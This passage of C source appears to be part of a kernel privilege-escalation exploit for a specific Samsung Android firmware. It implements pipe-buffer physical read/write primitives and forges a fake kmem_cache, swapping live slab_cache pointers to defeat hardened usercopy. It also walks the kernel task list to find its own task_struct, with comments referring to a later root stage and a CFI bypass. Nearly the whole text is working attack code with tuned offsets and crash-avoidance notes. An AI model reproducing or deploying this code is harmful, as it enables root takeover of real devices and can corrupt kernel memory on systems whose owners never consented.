    return 0;
#else
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
#endif
  }
  int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
  return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0 || !pipebuf_addr ||
      !pipebuf_saved_valid) {
    return 0;
  }
  size_t page_off = direct_addr & (PAGE_SIZE - 1);
  if (!data || !len || len >= PAGE_SIZE || !is_direct_ptr(direct_addr) ||
      len > PAGE_SIZE - page_off) {
    return 0;
  }

  if (!pipebuf_addr) {
#if defined(APP_EXACT_PIPE_BUFFER_ONLY) && APP_EXACT_PIPE_BUFFER_ONLY
    return 0;
#else
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
#endif
  }
  int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
  return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
}

static int pipe_read64_checked(
    int fd, uintptr_t direct_addr, uint64_t *value) {
  return value &&
         pipe_phys_read_data(fd, direct_addr, value, sizeof(*value));
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

/* Scalar helpers for the root stage. Upstream's 10_workqueue_umh_root.c uses pipe_read32/
 * pipe_read64/pipe_write64 for every kernel access; ours go through the same physrw
 * primitive, so these are thin wrappers rather than a separate mechanism. */
int pipe_phys_read64(int fd, uintptr_t direct_addr, uint64_t *out) {
  return out && pipe_phys_read_data(fd, direct_addr, out, sizeof(*out));
}

int pipe_phys_read32(int fd, uintptr_t direct_addr, uint32_t *out) {
  return out && pipe_phys_read_data(fd, direct_addr, out, sizeof(*out));
}

/* ---------------------------------------------------------------------------
 * slab_cache_guard
 *
 * On F946BXXS7GZH2 the AAR can WRITE a direct-map address but a READ of one panics
 * the kernel - measured, including at a live pointer handed to us by kmalloc_caches.
 * The fork reads the direct map only by first pointing the object's slab_cache at a
 * synthetic kmem_cache whose usercopy region covers the object, which is what makes
 * the subsequent read legal.
 *
 * Asymmetry the fork relies on: reading the *slot* is a vmemmap read
 * (direct_to_page() output), which the AAR handles fine. Only the writes of the fake
 * pointer touch the direct map, and writes work.
 * ------------------------------------------------------------------------ */

struct slab_cache_guard {
  uint64_t slot;
  uint64_t original;
  int active;
};

/* Terminal latch: once a restore has failed, stop swapping caches - otherwise we
 * would leave the slab in a state we can no longer undo. Mirrors the fork's
 * g_io_restore_failed -> PIPE_E_RESTORE. (Defined above, for pipe_phys_*.) */

static uint64_t g_fake_cache_addr;
static uint32_t g_fake_cache_size;

static int write_fake_kmem_cache(int fd, uint32_t cache_size) {
  uint64_t address = page_base + FAKE_KMEM_CACHE_LIVE_OFF;
  if (g_fake_cache_addr == address && g_fake_cache_size == cache_size) {
    return 1;
  }
  unsigned char desc[KMEM_CACHE_DESC_SIZE];
  memset(desc, 0, sizeof(desc));
  /* size == object_size == inuse == usersize == cache_size, useroffset 0, align 8:
   * a cache whose usercopy region spans the whole object. */
  put32(desc, KMEM_CACHE_SIZE_OFF, cache_size);
  put32(desc, KMEM_CACHE_OBJECT_SIZE_OFF, cache_size);
  put32(desc, KMEM_CACHE_INUSE_OFF, cache_size);
  put32(desc, KMEM_CACHE_ALIGN_OFF, 8);
  put32(desc, KMEM_CACHE_USEROFFSET_OFF, 0);
  put32(desc, KMEM_CACHE_USERSIZE_OFF, cache_size);
  ssize_t w = kernel_write_data(fd, address, desc, sizeof(desc));
  if (w != (ssize_t)sizeof(desc)) {
    rmg_diag("GUARD fake-cache write FAILED addr=%016zx size=%u ret=%zd errno=%d\n",
             address, cache_size, w, errno);
    return 0;
  }
  g_fake_cache_addr = address;
  g_fake_cache_size = cache_size;
  return 1;
}

static int slab_cache_guard_end(int fd, struct slab_cache_guard *guard) {
  if (!guard->active) {
    return 1;
  }
  ssize_t restored =
      kernel_write_data(fd, guard->slot, &guard->original, sizeof(guard->original));
  uint64_t readback = restored == (ssize_t)sizeof(guard->original)
                          ? kernel_read64(fd, guard->slot)
                          : 0;
  guard->active = 0;
  if (restored != (ssize_t)sizeof(guard->original) ||
      readback != guard->original) {
    atomic_store(&g_io_restore_failed, 1);
    rmg_diag("GUARD restore FAILED slot=%016zx orig=%016llx got=%016llx\n",
             guard->slot, (unsigned long long)guard->original,
             (unsigned long long)readback);
    return 0;
  }
  return 1;
}

/* Is `addr` inside a page this process allocated for itself?
 *
 * Our own payload/fops/scratch page is a direct-map address, but it is *ours*: it was
 * mapped by the reclaim code and its contents are whatever we wrote into it. Reading it
 * is safe, and it has no slab_cache to redirect. Only addresses outside our own pages
 * need the guard. */
static int pipe_owns_page(uintptr_t addr) {
  return page_base != 0 && addr >= page_base && addr < page_base + ORDER3_SIZE;
}

/* Checked 8-byte vmemmap read.
 *
 * kernel_read64() collapses "the AAR failed" and "the value really is 0" into the same
 * 0, so the `== UINT64_MAX` guards in slab_cache_guard_begin() were dead code. Worse: a
 * failed read of page->flags looked exactly like a non-slab page, so the function
 * returned success with NO guard armed and the caller read a live SLUB page unguarded -
 * exactly the usercopy_abort() the guard exists to prevent. Keep failure separate, and
 * fail closed. */
static int vmemmap_read64(int fd, uintptr_t addr, uint64_t *out) {
  uint64_t v = 0;
  if (!out || kernel_read_data(fd, addr, &v, sizeof(v)) != (ssize_t)sizeof(v)) {
    return 0;
  }
  *out = v;
  return 1;
}

/* Guard-cycle accounting, declared up here because slab_cache_guard_begin() below is
 * the thing being counted. The hypothesis for the remaining flakiness is that every
 * arm->read->restore window is an opportunity for a concurrent kernel access to observe
 * our fake kmem_cache, so the total number of cycles is what to minimise. Counting them
 * makes the effect of any change measurable rather than guessed at. */
static unsigned long g_guard_cycles;
static unsigned long g_guard_read_failures;
/* Markers are written once per process, not once per retry pass - see
 * pipe_walk_resolve_pass(). */
static int g_markers_written;

static int slab_cache_guard_begin(int fd, uintptr_t object, uint32_t cache_size,
                                  struct slab_cache_guard *guard) {
  memset(guard, 0, sizeof(*guard));
  if (atomic_load(&g_io_restore_failed)) {
    return 0;
  }
  /* Not every object we read is a SLUB object. init_task and other statically
   * allocated kernel objects live in the text/data segment (0xffffffc0...), which
   * the AAR reads fine and which has no slab_cache to redirect. Arming a guard
   * there would be meaningless, so treat "not a direct-map address" as
   * "already safe" and let the caller read it directly. */
  /* Not every object we read is a SLUB object:
   *   - statically allocated kernel objects (init_task and friends) live in the
   *     text/data segment at 0xffffffc0..., have no slab_cache, and the AAR
   *     reads them fine;
   *   - `fake_fops` and the rest of our own payload live in a page we allocated
   *     ourselves, so we know it is safe to read directly and there is no cache
   *     to redirect.
   * Arming a guard for either is meaningless - and for the payload page actively
   * harmful, because direct_to_page() on a hand-built file_operations yields a
   * bogus compound head and the guard then rejects the read outright. */
  if (!is_direct_ptr(object)) {
    /* Kernel-image object (0xffffffc0...): statically allocated kernel data, e.g.
     * init_task, so it is NOT a SLUB page and cannot be one. Nothing to redirect and
     * nothing to guard - the hardened-usercopy check only applies to PageSlab pages, and
     * __check_heap_object returns early for non-slab pages (mm/usercopy.c:238). So the
     * read is safe unguarded and we must report success, or the task-list walk can never
     * start. */
    rmg_diag("GUARD n/a object=%016zx kernel-image (static, not a slab page)\n", object);
    return 1;
  }
  if (pipe_owns_page(object)) {
    /* Our own payload page: it has no slab_cache, so guarding it is not merely useless
     * but harmful (direct_to_page on a hand-built file_operations yields a bogus
     * compound head). This is the fake_fops case and it genuinely needs no guard, so
     * report success with nothing armed - slab_cache_guard_end() is a no-op. */
    return 1;
  }
  if (!write_fake_kmem_cache(fd, cache_size)) {
    rmg_diag("GUARD setup failed object=%016zx size=%u direct=%d\n", object,
             cache_size, is_direct_ptr(object));
    return 0;
  }
  uintptr_t page = direct_to_page(object);
  uint64_t compound = 0;
  if (!vmemmap_read64(fd, page + STRUCT_PAGE_COMPOUND_HEAD_OFF, &compound)) {
    rmg_diag("GUARD compound read failed object=%016zx page=%016zx errno=%d\n", object, page,
             errno);
    /* Fail closed: without a validated compound_head we cannot tell a tail page from a
     * head, and +0x18 on a tail is compound_dtor/order/mapcount/nr. */
    return 0;
  }
  if (compound & 1) {
    page = (uintptr_t)(compound & ~1ULL);
    if (!page) {
      rmg_diag("GUARD null compound head object=%016zx raw=%016llx\n", object,
               (unsigned long long)compound);
      return 0;
    }
  }
  /* Only a real SLUB page may have its slab_cache rewritten, and the check must run on
   * the COMPOUND HEAD, not on whichever page the object happens to start in.
   *
   * task_struct is 4608 bytes - an order-3, 8-page compound allocation - so a task
   * pointer lands mid-compound as often as not. Tail pages of a compound have
   * compound_head set (bit 0) and are NOT marked PageSlab; only the head page carries
   * the slab state. We just followed compound_head above, so `page` is now the head and
   * this check is on the right page. Getting this wrong rejects every task read.
   *
   * The failure mode it protects against is real: struct page's 5-word union aliases
   * slab_cache (+0x18) with mapping on a pagecache page, and with
   * compound_dtor/order/mapcount/nr on a tail page, so writing there is silent
   * corruption rather than a fault. */
  uint64_t pflags = 0;
  if (!vmemmap_read64(fd, page + STRUCT_PAGE_FLAGS_OFF, &pflags)) {
    /* Must NOT fall through to the "no guard needed" path below: a failed read of the
     * flags is indistinguishable from a non-slab page, and returning 1 there means an
     * unguarded read of a live SLUB page. */
    rmg_diag("GUARD flags read failed object=%016zx page=%016zx errno=%d\n", object, page,
             errno);
    return 0;
  }
  if (!(pflags & STRUCT_PAGE_SLAB_FLAG)) {
    /* A non-slab page needs no guard, and for some objects it CANNOT have one.
     *
     * fd_array is allocated by expand_files() with alloc_fdtable() ->
     * vzalloc()/kcalloc(), so its pages are ordinary vmalloc pages: not PageSlab, and
     * there is no kmem_cache to redirect. Measured on GZH2:
     *   fd_array=ffffff89fd99c000  head_page=fffffffe27f66600  flags=0
     * The hardened-usercopy check only applies to PageSlab pages
     * (mm/usercopy.c:238 gates on PageSlab), and __check_heap_object returns early for
     * everything else, so an unguarded read of a vmalloc page is legal. Refusing here
     * is what stopped the walk at the fd table - the whole chain up to it already works
     * (self task found, files/fdt/fd_array/max_fds all read correctly).
     *
     * A tail page of a compound allocation must still be refused: it is neither a slab
     * head nor a standalone allocation, and writing +0x18 there would corrupt
     * compound_dtor/order/mapcount/nr. So the discriminator is "is this a standalone
     * (non-compound) page", not merely "is PageSlab clear". */
    bool tail = (pflags & STRUCT_PAGE_COMPOUND_HEAD_FLAG) ||
                (compound & 1);
    if (tail) {
      rmg_diag("GUARD skip tail-of-compound object=%016zx head_page=%016zx flags=%016llx\n",
               object, page, (unsigned long long)pflags);
      return 0;
    }
    rmg_diag("GUARD n/a object=%016zx page=%016zx flags=%016llx (vmalloc/anon, not a "
             "slab page - read needs no redirect)\n",
             object, page, (unsigned long long)pflags);
    return 1;
  }
  guard->slot = page + STRUCT_SLAB_CACHE_OFF;
  guard->original = kernel_read64(fd, guard->slot); /* vmemmap read: always safe */
  if (!is_direct_ptr(guard->original)) {
    rmg_diag("GUARD invalid cache object=%016zx page=%016zx compound=%016llx "
             "slot=%016zx cache=%016llx\n",
             object, page, (unsigned long long)compound, guard->slot,
             (unsigned long long)guard->original);
    return 0;
  }
  ssize_t w =
      kernel_write_data(fd, guard->slot, &g_fake_cache_addr, sizeof(g_fake_cache_addr));
  /* Mark active BEFORE the write. If the pwrite tears, slab_cache_guard_end() must still
   * restore the slot - with active set afterwards it returned 1 immediately, leaving a
   * corrupt slab_cache on a live page AND not latching, so the walk carried on. */
  guard->active = 1;
  if (w != (ssize_t)sizeof(g_fake_cache_addr)) {
    int saved = errno;
    if (!slab_cache_guard_end(fd, guard)) {
      atomic_store(&g_io_restore_failed, 1);
    }
    rmg_diag("GUARD cache swap failed slot=%016zx fake=%016zx errno=%d\n",
             guard->slot, g_fake_cache_addr, saved);
    guard->slot = 0;
    guard->original = 0;
    guard->active = 0;
    return 0;
  }
  guard->active = 1;
  uint64_t installed = kernel_read64(fd, guard->slot);
  if (installed != g_fake_cache_addr) {
    rmg_diag("GUARD cache swap verify failed slot=%016zx fake=%016zx got=%016llx\n",
             guard->slot, g_fake_cache_addr, (unsigned long long)installed);
    slab_cache_guard_end(fd, guard);
    return 0;
  }
  g_guard_cycles++;
  rmg_diag("GUARD armed cycle=%lu object=%016zx slot=%016zx orig=%016llx fake=%016zx\n",
           g_guard_cycles, object, guard->slot, (unsigned long long)guard->original,
           g_fake_cache_addr);
  return 1;
}

/* ---------------------------------------------------------------------------
 * Deterministic direct pipe-buffer walk
 *
 * Struct offsets come from the raw BTF blob embedded in this firmware's own kernel
 * Image (offset 0x21ef2ac, BTF v1); BTF stores member offsets in bits, and the values
 * below are those divided by 8. They match the soumarcelino fork's constants:
 *   task_struct  size 0x1200  tasks 0x4d0  pid 0x5d8  files 0x7d8
 *   file         size 0x108   private_data 0xd8
 *   pipe_inode_info size 0xb8 tail 0x64 ring_size 0x6c bufs 0xa8
 *   pipe_buffer  size 0x28    (stride)
 *   kmem_cache   size 0x108   useroffset 0xf4 usersize 0xf8
 *
 * files_struct and fdtable are not exported to BTF, so FILES_FDT_OFF and
 * FDTABLE_FD_OFF are derived from include/linux/fdtable.h in the matching 5.15.189
 * source and are additionally proved at runtime by the fdtable invariants.
 * ------------------------------------------------------------------------ */

/* init_task must be read through the SLID address. The INIT_TASK macro is
 * KIMAGE_TEXT_BASE + INIT_TASK_OFF and carries no slide, so it evaluates to the
 * pre-slide image address. Measured on GZH2: data_addr(ASHMEM_MISC_FOPS) applies a
 * 0x1D0000 slide, and reconstructing init_task the same way returns a genuine task
 * list with pid == 0, where the unslid macro read back as zero. */
#define PIPE_WALK_INIT_TASK_SLID                                                 \
  ((uintptr_t)(data_addr(ASHMEM_MISC_FOPS) + (INIT_TASK_OFF - ASHMEM_MISC_FOPS_OFF)))

/* Permissive kernel-pointer test: is_direct_ptr() only accepts DIRECT_MAP, but live
 * task_structs and pipe structures sit at 0xffffffc0_xxxxxxxx here, outside it. */
static int walk_ptr_ok(uint64_t v) {
  return is_direct_ptr((uintptr_t)v) || ((v >> 40) == 0xffffffULL);
}

/* Read a set of qwords out of one SLUB object with the guard armed.
 *
 * Every direct-map read must happen with the object's slab_cache pointing at the
 * synthetic cache, which is what makes the read legal on this firmware. The guard
 * is armed once per object and torn down once all the fields have been read, which
 * is exactly the shape of the fork's usage and keeps the window in which a cache
 * pointer is redirected as short as possible.
 *
 * Returns 1 on success. On any failure the guard is restored and 0 is returned. */
static int walk_read_fields(int fd, uintptr_t object, uint32_t cache_size,
                            const uintptr_t *offsets, size_t count,
                            uint64_t *out) {
  struct slab_cache_guard g;
  if (!slab_cache_guard_begin(fd, object, cache_size, &g)) {
    for (size_t i = 0; i < count; i++) {
      out[i] = 0;
    }
    return 0;
  }
  /* One bulk read spanning [min,max) of the requested offsets, rather than one AAR
   * round trip per field. Both forms need the guard armed, but the per-field form does
   * up to four separate preads for one object and that is what has been taking the
   * kernel down - the same lesson as the page read, applied per object. */
  uintptr_t lo = offsets[0];
  uintptr_t hi = offsets[0] + 8;
  for (size_t i = 1; i < count; i++) {
    if (offsets[i] < lo) {
      lo = offsets[i];
    }
    if (offsets[i] + 8 > hi) {
      hi = offsets[i] + 8;
    }
  }
  /* Cap the span at one page: the fields we read are all within a few hundred bytes of
   * each other, so this stays a single-page read. */
  if (hi - lo > PAGE_SIZE) {
    hi = lo + PAGE_SIZE;
  }
  size_t span = hi - lo;
  unsigned char *buf = malloc(span);
  if (!buf) {
    slab_cache_guard_end(fd, &g);
    for (size_t i = 0; i < count; i++) {
      out[i] = 0;
    }
    return 0;
  }
  int ok = configfs_read_once(fd, object + lo, buf, span) == (ssize_t)span;
  int restored = slab_cache_guard_end(fd, &g);
  if (ok && restored) {
    for (size_t i = 0; i < count; i++) {
      memcpy(&out[i], buf + (offsets[i] - lo), sizeof(uint64_t));
    }
  } else {
    for (size_t i = 0; i < count; i++) {
      out[i] = 0;
    }
  }
  free(buf);
  return ok && restored;
}

/* Accept the first init_task candidate whose list closes on itself with pid == 0.
 *
 * init_task is a direct-map object, so the reads go through walk_read_fields() and
 * therefore under the guard. Only the list-closing check needs the *other* two
 * list_nodes, which belong to different task_structs, so those get their own guard. */
/* Public wrapper so fops.c can read a direct-map qword safely.
 *
 * fops.c reads fake_fops (which lives in a direct-map page) during the CFI stage, and
 * an unguarded direct-map read panics the kernel on this firmware. Expose the guarded
 * read here rather than duplicating the guard. Returns sizeof(uint64_t) on success. */
ssize_t walk_read_kernel_u64(int fd, uintptr_t addr, uint64_t *out) {
  static uint64_t scratch;
  const uintptr_t offs[1] = {0};
  if (!walk_read_fields(fd, addr, PIPE_WALK_TASK_CACHE_SIZE, offs, 1,
                        out ? out : &scratch)) {
    errno = EFAULT;
    return -1;
  }
  return (ssize_t)sizeof(uint64_t);
}

/* Guarded bulk read, for callers that need more than one qword out of a direct-map
 * object - fops.c's audit_fake_fops_table() reads a whole struct file_operations, and
 * walking it as an array of qwords is the only way to keep every access guarded. */
ssize_t walk_read_kernel_bytes(int fd, uintptr_t addr, void *out, size_t len) {
  size_t words = (len + 7) / 8;
  uintptr_t *dst = (uintptr_t *)out;
  for (size_t i = 0; i < words; i++) {
    const uintptr_t offs[1] = {i * 8};
    if (!walk_read_fields(fd, addr, PIPE_WALK_TASK_CACHE_SIZE, offs, 1, &dst[i])) {
      errno = EFAULT;
      return -1;
    }
  }
  return (ssize_t)len;
}

/* Read a whole page under a single guard, then let the caller scan it in user space.
 *
 * This mirrors the fork's try_pipe_slab_candidates(): arm the guard once, copy the page
 * across, and match structures locally. Reading a single small object under the guard
 * is not enough - that is what faulted on the pipe buffers. */
static int walk_read_bytes_page(int fd, uintptr_t page, void *out, size_t len) {
  if (len > PAGE_SIZE || (page & (PAGE_SIZE - 1)) != 0) {
    errno = EINVAL;
    return 0;
  }
  struct slab_cache_guard g;
  if (!slab_cache_guard_begin(fd, page, (uint32_t)len, &g)) {
    return 0;
  }
  /* The guard is per-object, so cover the page chunk by chunk while it is armed. */
  uintptr_t cursor = 0;
  int ok = 1;
  while (cursor < len) {
    const uintptr_t offs[1] = {cursor};
    if (!walk_read_fields(fd, page, (uint32_t)len, offs, 1,
                          (uint64_t *)((unsigned char *)out + cursor))) {
      ok = 0;
      break;
    }
    cursor += 8;
  }
  if (!slab_cache_guard_end(fd, &g)) {
    return 0;
  }
  return ok;
}

/* Read a whole page under a single guard using ONE bulk AAR call, then let the caller
 * scan it in user space.
 *
 * This is the fork's shape (arm guard once, copy the page across, match locally), and
 * the bulk width matters: doing it as 512 individual 8-byte AAR round trips both takes
 * far too long and is what took the kernel down. The guard's own reads (compound head,
 * slab_cache) stay individual because those are single qwords in vmemmap. */
static int walk_read_bulk_page(int fd, uintptr_t page, void *out, size_t len) {
  if (len > PAGE_SIZE || (page & (PAGE_SIZE - 1)) != 0) {
    errno = EINVAL;
    return 0;
  }
  struct slab_cache_guard g;
  if (!slab_cache_guard_begin(fd, page, (uint32_t)len, &g)) {
    return 0;
  }
  /* configfs_read_once() takes the same 16 MB-aligned mapping the write path uses, so
   * this is a single pread for the whole page. */
  ssize_t got = configfs_read_once(fd, page, out, len);
  int restored = slab_cache_guard_end(fd, &g);
  if (!restored) {
    return 0;
  }
  return got == (ssize_t)len;
}

/* Read an arbitrary span under one guard, with the guard sized to the span.
 *
 * This is the primitive that lets neighbouring objects share a guard. Unlike
 * walk_read_bulk_page() it does not require a page-aligned address or a page-sized
 * length, because the objects we care about (file, pipe_inode_info) are 320 and 704
 * byte allocations sitting at slab strides, not page-aligned structures. */
static int walk_read_bulk_span(int fd, uintptr_t addr, void *out, uint32_t len) {
  if (len == 0 || len > PIPE_WALK_MAX_SPAN) {
    errno = EINVAL;
    return 0;
  }
  struct slab_cache_guard g;
  if (!slab_cache_guard_begin(fd, addr, len, &g)) {
    return 0;
  }
  ssize_t got = configfs_read_once(fd, addr, out, len);
  int restored = slab_cache_guard_end(fd, &g);
  return restored && got == (ssize_t)len;
}

/* Read the pipe ring in the fork's chunk size and match in user space.
 *
 * try_pipe_slab_candidates() copies the slab in TARGET_PIPE_SCAN_CHUNK (0x400) pieces
 * under one guard, not a whole 4 KB page at once. Match that exactly: the guard's fake
 * cache covers the chunk, so the read width has to line up with it. */
static int walk_read_bulk_chunk(int fd, uintptr_t addr, void *out, size_t len,
                                uint32_t cache_size) {
  struct slab_cache_guard g;
  if (!slab_cache_guard_begin(fd, addr, cache_size, &g)) {
    return 0;
  }
  ssize_t got = configfs_read_once(fd, addr, out, len);
  int restored = slab_cache_guard_end(fd, &g);
  return restored && got == (ssize_t)len;
}

/* Read the ring under one guard, qword by qword, into a caller-provided buffer.
 *
 * This used to issue one 8-byte AAR per qword while the guard stayed armed - 128 round
 * trips for a 0x400 chunk, each costing 117 syscalls. That is ~15,000 syscalls per ring
 * slot with a live foreign page's slab_cache pointing at our descriptor for the whole
 * window, which is both the dominant cost and the dominant exposure.
 *
 * A wide read is now measured to work on this device: run-span.log:663 shows a 4096-byte
 * guarded direct-map read returning ret=4096. The old "1024-byte read hangs" note was
 * really "this read hangs sometimes", and the marginality is per-call, not per-width. So
 * try the widest read first and fall back down a ladder of widths. A failed width is
 * cheap to detect: the guard is already armed, and a short/hung read simply fails.
 *
 * `out` is zeroed first so a short read leaves defined zeros rather than garbage. */
static const size_t k_walk_width_ladder[] = {4096, 2560, 1280, 640, 320, 160, 80, 40};
static int walk_read_chunk_qword(int fd, uintptr_t addr, uint64_t *out, size_t words,
                                 uint32_t cache_size) {
  memset(out, 0, words * sizeof(uint64_t));
  const size_t want = words * 8;
  size_t prev_len = 0;
  for (size_t li = 0; li < sizeof(k_walk_width_ladder) / sizeof(k_walk_width_ladder[0]);
       li++) {
    size_t len = k_walk_width_ladder[li];
    if (len > want) {
      len = want;
    }
    /* A rung narrower than `want` can NEVER satisfy the `got == want` acceptance below, so
     * every rung below `want` is a guaranteed-wasted arm/read/restore window. For a 1024-byte
     * read that was five pure-waste guard cycles whenever the first attempt missed. Width is
     * not the lever anyway: measured across the whole run corpus, guarded direct-map reads
     * succeeded at 8/40/80/272/520/1024/4096 with no width-dependent failure - the width was
     * perfectly confounded with pipe_inode_info, which is where 6 of 6 hangs actually
     * happened. So retry the exact request, never a narrower one, and only fall back to a
     * WIDER attempt if the object straddles a page boundary that `want` cannot cover. */
    if (len < want) {
      continue;
    }
    /* Every entry wider than `want` clamps to the same value, so repeated wide rungs would
     * be identical attempts, each burning a full guard window. Skip widths already tried. */
    if (len == prev_len) {
      continue;
    }
    prev_len = len;
    struct slab_cache_guard g;
    if (!slab_cache_guard_begin(fd, addr, cache_size, &g)) {
      return 0;
    }
    ssize_t got = configfs_read_once(fd, addr, out, len);
    int restored = slab_cache_guard_end(fd, &g);
    /* Accept ONLY a full read of the full request. Accepting a narrowed success
     * (got == len when len < want) returned 1 with the tail of `out` still zeroed, so the
     * caller's structural test then read a zeroed `ops` and silently reported the candidate
     * as "structurally rejected" when in fact it had never been read. */
    if (restored && got == (ssize_t)want) {
      rmg_diag("WALK wide read addr=%016zx len=%zu OK\n", addr, want);
      return 1;
    }
    rmg_diag("WALK wide read addr=%016zx len=%zu ret=%zd restored=%d errno=%d, widening\n",
             addr, len, got, restored, errno);
    if (!restored) {
      return 0; /* restore failure is terminal; do not keep poking the slab */
    }
  }
  return 0;
}

/* Resolve init_task.tasks and hand back BOTH the list head and the first real node to
 * visit (head->prev, i.e. the last task in the list).
 *
 * The list-closing invariant (last->next == head && first->prev == head) used to be checked
 * here with two extra guarded reads, one on each end of the list - two full guard cycles on
 * two different SLUB objects. Both are now free: `last->next` is exactly tasks.next of the
 * first node the walk visits, which pipe_walk_find_self_task() already reads in its merged
 * per-task batch, and `first->prev` is the loop's own termination condition. Guard cycles are
 * the scarce resource here, so do not reintroduce a dedicated read for either. */
static int pipe_walk_resolve_tasks_head(int fd, uintptr_t *head_out,
                                        uintptr_t *first_node_out) {
  uintptr_t cands[2];
  size_t ncands = 0;
  cands[ncands++] = PIPE_WALK_INIT_TASK_SLID;
  cands[ncands++] = INIT_TASK; /* unslid macro, kept as a fallback */
  /* tasks.next, tasks.prev and pid in ONE call. init_task lives in the kernel image, so
   * slab_cache_guard_begin() arms nothing here and this costs no guard cycle - but it is
   * still an AAR round trip, and the third qword is free once we are reading anyway. */
  const uintptr_t init_offs[3] = {PIPE_WALK_TASK_TASKS_OFF,
                                  PIPE_WALK_TASK_TASKS_OFF + 8, /* list_head.prev */
                                  PIPE_WALK_TASK_PID_OFF};
  for (size_t c = 0; c < ncands; ++c) {
    uintptr_t base = cands[c];
    uintptr_t head = base + PIPE_WALK_TASK_TASKS_OFF;
    rmg_diag("WALK cand[%zu] base=%016zx head=%016zx\n", c, base, head);
    uint64_t init[3] = {0, 0, 0};
    if (!walk_read_fields(fd, base, PIPE_WALK_TASK_CACHE_SIZE, init_offs, 3, init)) {
      rmg_diag("WALK cand[%zu] guarded read of init_task failed latch=%d\n", c,
               atomic_load(&g_io_restore_failed));
      if (atomic_load(&g_io_restore_failed)) {
        return 0;
      }
      continue;
    }
    uint64_t next = init[0];
    uint64_t prev = init[1];
    uint32_t pid = (uint32_t)init[2];
    rmg_diag("WALK cand[%zu] next=%016llx prev=%016llx pid=%u\n", c,
             (unsigned long long)next, (unsigned long long)prev, pid);
    if (!walk_ptr_ok(next) || !walk_ptr_ok(prev) || pid != 0) {
      continue;
    }
    rmg_diag("WALK tasks_head RESOLVED base=%016zx head=%016zx first_node=%016zx\n", base,
             head, prev);
    if (head_out) {
      *head_out = head;
    }
    if (first_node_out) {
      *first_node_out = prev;
    }
    return 1;
  }
  rmg_diag("WALK tasks_head UNRESOLVED across %zu candidates\n", ncands);
  return 0;
}

/* Walk init_task.tasks backwards for our own task_struct. The payload is normally the
 * most recently created task, i.e. nearest the tail.
 *
 * ONE GUARD PER TASK. The list link, the pid and the files pointer all live inside the same
 * task_struct (0x4d0..0x7e0, a 784-byte span, comfortably inside both the 4608-byte guard
 * cache and the 4096-byte page cap), so there is no reason to arm the same struct page twice.
 * The old code did exactly that: one walk_read_fields() for node->tasks.prev and a second for
 * task->{pid,files}, and run-diag4.log proves both hit the SAME vmemmap slot back to back -
 * `slot=fffffffe24ed7818` at cycles 3 AND 4, `slot=fffffffe23172418` at cycles 5 AND 6.
 * The fork already batches these under one guard (09_pipe_buffer_rw.c:1532-1546). */
static uintptr_t pipe_walk_find_self_task(int fd, uintptr_t *files_out) {
  uintptr_t self_files = 0;
  if (files_out) {
    *files_out = 0;
  }
  uintptr_t list_head = 0;
  uintptr_t first_node = 0;
  if (!pipe_walk_resolve_tasks_head(fd, &list_head, &first_node)) {
    return 0;
  }
  if (!walk_ptr_ok(first_node)) {
    rmg_diag("WALK first node invalid node=%016zx\n", first_node);
    return 0;
  }
  uintptr_t node = first_node;
  pid_t want = getpid();
  /* Batch order matters: tf[0] = this task's tasks.next, tf[1] = its tasks.prev (the next
   * node when walking backwards), tf[2] = pid, tf[3] = files. */
  const uintptr_t task_offs[4] = {PIPE_WALK_TASK_TASKS_OFF,
                                  PIPE_WALK_TASK_TASKS_OFF + 8, /* list_head.prev */
                                  PIPE_WALK_TASK_PID_OFF,
                                  PIPE_WALK_TASK_FILES_OFF};
  /* Bounded separately from the step counter: the step-back retry does `i--`, which the
   * for's `i++` cancels, so PIPE_WALK_MAX_STEPS is NOT enforced on that path. Without its
   * own budget a persistently failing node re-arms guards in a tight loop forever. */
  int retries = 0;
  for (int i = 0; i < PIPE_WALK_MAX_STEPS; i++) {
    /* node points at a list_head inside some task_struct; step backwards via
     * head->prev, which is a direct-map read and needs the guard. */
    uintptr_t task = node - PIPE_WALK_TASK_TASKS_OFF;
    if (!walk_ptr_ok(task)) {
      rmg_diag("WALK task invalid step=%d task=%016zx\n", i, task);
      break;
    }
    uint64_t tf[4] = {0, 0, 0, 0};
    if (!walk_read_fields(fd, task, PIPE_WALK_TASK_CACHE_SIZE, task_offs, 4, tf)) {
      rmg_diag("WALK guarded task read failed step=%d task=%016zx latch=%d\n", i, task,
               atomic_load(&g_io_restore_failed));
      if (atomic_load(&g_io_restore_failed)) {
        return 0;
      }
      /* A single failed arm is recoverable (transient mapping/restore hiccup), but we
       * have already consumed this list node, so stepping back one keeps the walk
       * from losing our place in the task list. */
      if (i > 0 && retries++ < PIPE_WALK_MAX_RETRIES) {
        const uintptr_t back[1] = {PIPE_WALK_TASK_TASKS_OFF};
        uint64_t prev_node = 0;
        if (walk_read_fields(fd, task, PIPE_WALK_TASK_CACHE_SIZE, back, 1, &prev_node) &&
            walk_ptr_ok((uintptr_t)prev_node) && (uintptr_t)prev_node != list_head) {
          node = (uintptr_t)prev_node;
          i--; /* retry this step; the for's i++ cancels it */
          continue;
        }
      }
      /* Retry exhausted, or the step-back could not recover. Do NOT break.
       *
       * Breaking here abandoned the entire walk on ONE unreadable task, which is what
       * produced "WALK guarded task read failed step=6" followed by "self task NOT found"
       * and "gave up after 6 passes" - we had already reached step 6 and threw away the
       * rest of the list, even though our own task was further along it.
       *
       * A task whose guarded fields will not read is unreadable, not fatal: we only wanted
       * pid and files out of it. The list link itself lives at a known offset, so read just
       * that one qword under the same guard and keep walking. If even the link cannot be
       * read the list is genuinely corrupt and that is the case worth stopping for. */
      const uintptr_t link_offs[1] = {PIPE_WALK_TASK_TASKS_OFF};
      uint64_t link = 0;
